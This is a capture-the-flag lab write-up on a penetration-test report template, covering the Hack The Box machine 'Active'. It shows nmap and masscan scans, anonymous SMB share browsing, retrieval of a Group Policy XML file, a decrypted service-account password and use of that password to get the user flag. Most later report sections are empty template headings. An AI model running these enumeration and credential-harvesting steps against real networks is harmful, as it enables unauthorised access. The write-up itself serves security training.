---
title: "Offensive Security Certified Professional Exam Report"
author: ["your@mail.com", "OSID: XXXX"]
date: "2021-01-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Lab Report"
lang: "en"
titlepage: true,
titlepage-rule-color: "360049"
titlepage-rule-height: 2
titlepage-background: "res/background1.pdf"
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Active (Windows)


# Soluces

[ippsec video of shocker](https://www.youtube.com/watch?v=jUc1J31DNdw)  
[soluces from ](https://github.com/michoo/sec-learning/blob/master/soluces/2_Windows/active-writeup-w-o-metasploit.md)  
[soluces from Hack the box](https://github.com/michoo/sec-learning/blob/master/2_Windows/Active/soluce/Active.pdf)

# Methodologies

## Reconnaissance

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the shocker machine.

The specific IP addresse was:

**Scope**

- 10.129.144.210

My attacking ip machine was 10.0.2.15

## System IP: 10.129.144.210
### Enumeration


Lets do a nmap

```bash
mkdir nmap
sudo nmap -sC -sV -O -oA nmap/initial 10.129.144.210 -Pn
    -sC: run default nmap scripts
    -sV: detect service version
    -O: detect OS
    -oA: output all formats and store in file nmap/initial

```
```
Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-12T02:06:53
|_  start_date: 2021-05-12T01:42:24

```

NB: Message signing enabled and required -> which prevents SMB Relay attacks.

```
ls -la /usr/share/nmap/scripts | grep smb2
```

smb2-time
Find the system and start date of the server
```
nmap --script smb2-time -oA nmap/smb2-time -v 10.129.144.210 -Pn
```

smb2-security-mode
The script sends a SMB2_COM_NEGOTIATE request for each SMB2/SMB3 dialect and parses the security mode field to determine the message signing configuration of the SMB server.

References:

    https://msdn.microsoft.com/en-us/library/cc246561.aspx

-> nothing... 


JOKER!

```
masscan -p1-65535 10.129.144.210 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F  " "  '{print $4}' | awk -F  "/"  '{print $1}' | sort -n | tr  '\n'  ',' | sed 's/,$//') 
nmap -Pn -sV -sC -p​ $ports​ 10.129.144.210
```

Nmap reveals an Active Directory installation with a domain of “active.htb”. Microsoft DNS 6.1 is
running, which allows nmap to fingerprint the domain controller as Windows Server 2008 R2 SP1.
Port 445 is open and so it is worth running further nmap SMB scripts.

Let's find some nmap scripts to use
https://nmap.org/book/nse-usage.html

different categories
auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln.

safe:
Scripts which weren't designed to crash services, use large amounts of network bandwidth or other resources, or exploit security holes are categorized as safe. These are less likely to offend remote administrators, though (as with all other Nmap features) we cannot guarantee that they won't ever cause adverse reactions. Most of these perform general network discovery. Examples are ssh-hostkey (retrieves an SSH host key) and html-title (grabs the title from a web page). Scripts in the version category are not categorized by safety, but any other scripts which aren't in safe should be placed in intrusive.

```
nmap --script safe -p 445 10.129.144.210
```
[nmap good](image/Screenshot_2021-05-11_23-04-08-nmap-good.png)  




Enumerate any available file shares

```
smbclient -L //10.129.144.210 
```

[smbclient](image/Screenshot_2021-05-11_23-06-39-smbclient.png)  

we can connect on "Replication" is accessible in read for anybody. Seems to be a backup.

```
smbclient  //10.129.144.210/Replication   
smb: RECURSE ON
smb: PROMPT OFF
smb: mget *
```

[smb download](image/Screenshot_2021-05-11_23-21-18-smb-download.png)

NB: it's possible to navigate (cd , dir,...) mget directly a file with "mget filename.extension". Don't know why but I need to set Prompt to Off... "y" doesn't work  

it's possible to have shortcut to query and download the groups.xml file directly

```
smbmap -R Replication -H 10.129.144.210 -A Groups.xml -q
```

Or it's possible to mount the directory as normal smb
```
sudo apt-get install cifs-utils
mkdir /mnt/Replication
mount -t cifs //10.129.144.210/Replication /mnt/Replication -o
username=<username>,password=<password>,domain=active.htb
grep -R password /mnt/Replication
```
-> to find password into Replication

[history of gpp](image/Screenshot_2021-05-11_23-51-27grouppolicy.png)

gpp decrypt password
[groups.xlm](image/Screenshot_2021-05-11_23-20-43-group.xml.png)

[gpp decrypt](image/Screenshot_2021-05-11_23-20-44-gpp-password-decrypted.png)


so the password for SVC_TGS is GPPstillStandingStrong2k18

```
smbclient -U SVC_TGS //10.129.144.210/Users   
smb: PROMPT OFF
cd Users/SVC_TGS/Desktop
mget user.txt
```

[flag](image/Screenshot_2021-05-11_23-36-20-dl-flag.png)

#### TCP

#### UDP

#### Web Services

#### Other Services

#### Harvested Informations

#### Vuln Investigation

##### Check for exploits

### Penetration

### Post exploitation

#### Host Information

#### File system

#### Running processes

#### Installed applications

#### Users & Group

#### Network

#### Scheduled job

### Privilege escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Exploit Code:**

### Goodies

#### Hashes

#### Passwords

#### Proof/Flags/Other

**Proof Screenshot Here:**

**Proof.txt Contents:**

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, Alec removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Detailed Recommandations

## Technical

## Governance

## Blue team

# Additional Items

## Appendix - Proof and Local Contents

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here

## Appendix - Metasploit/Meterpreter Usage

For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`

## Appendix - Completed Buffer Overflow Code

```
code here
```
